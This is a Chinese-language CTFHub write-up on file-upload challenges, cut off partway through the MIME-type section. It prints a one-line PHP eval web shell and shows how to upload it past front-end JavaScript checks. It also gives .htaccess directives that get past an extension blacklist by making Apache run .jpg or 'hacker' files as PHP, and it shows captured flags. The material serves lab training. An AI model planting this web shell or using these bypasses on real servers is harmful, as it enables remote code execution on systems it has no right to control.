## CTFHUB--文件上传

[TOC]

```php
<?php @eval($_POST['cmd']); ?>
```



### 无限制

![image-20240828124801090](https://gitee.com/bx33661/image/raw/master/path/image-20240828124801090.png)

直接上传一句话代码，`muma.php`,利用蚁jian访问，在文件中寻找

```php
<?php // ctfhub{ea7b671901e141cfcc6a18a4}
```



### 前端验证

如果我们还按照之前的操作上传php文件的话，会被js拦截

1. 禁用js，上传一句话木马

![image-20240828125737993](https://gitee.com/bx33661/image/raw/master/path/image-20240828125737993.png)

2. 抓包，修改包名字，绕过前端

最后文件搜索找到

```php
<?php // ctfhub{9d3d140083c174996a1311e6}
```



### .htaccess

> 题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

代码审计：是后端过滤

```php
if (!empty($_POST['submit'])) {
    $name = basename($_FILES['file']['name']);
    $ext = pathinfo($name)['extension'];
    $blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf");
    if (!in_array($ext, $blacklist)) {
        if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {
            echo "<script>alert('上传成功')</script>";
            echo "上传文件相对路径<br>" . UPLOAD_URL_PATH . $name;
        } else {
            echo "<script>alert('上传失败')</script>";
        }
    } else {
        echo "<script>alert('文件类型不匹配')</script>";
  
```

采用`.htaccess`文件绕过

```
# AddType application/x-httpd-php .jpg是一个配置指令，用于设置文件的MIME类型。MIME类型是一种用于描述文件内容的标准，它告诉服务器如何处理特定的文件。

# application/x-httpd-php是PHP解释器的MIME类型。这意味着当Apache服务器接收到一个请求，并且请求的文件是.jpg时，它将尝试使用PHP解释器来处理这个文件。
AddType application/x-httpd-php .jpg
```



```
#<FilesMatch "hacker">开始了一个匹配文件的条件。它告诉Apache服务器，只有当请求的文件名匹配到"hacker"时，才应用接下来的配置。

#在<FilesMatch>标签内部，SetHandler application/x-httpd-php是配置指令。SetHandler指令用于设置处理请求的程序或模块。在这个例子中，它告诉Apache服务器，当文件名匹配到"hacker"时，使用PHP解释器来处理这个文件。

#application/x-httpd-php是PHP解释器的MIME类型，它告诉服务器要使用PHP来解析和执行文件。

#最后，</FilesMatch>结束了文件匹配的条件，之后的配置指令将不再受此条件约束。

<FilesMatch "hacker">
SetHandler application/x-httpd-php
</FilesMatch>
```



### MIME绕过



- `text/plain`（纯文本）

- `text/html`（HTML文档）
- `text/javascript`（JS代码）
- `application/xhtml+xml`（XHTML文档） 
- `image/gif`（GIF图像）
- `image/jpeg`（JPEG图像）
- `image/png`（PNG图像） 
- `video/mpeg`（MPEG动画） 
- `application/octet-stream`（二进制数据） 
-  `application/pdf`（PDF文档）

老样子进入需要提交文件，上传php不行

bp抓包，修改`application/octet-stream` 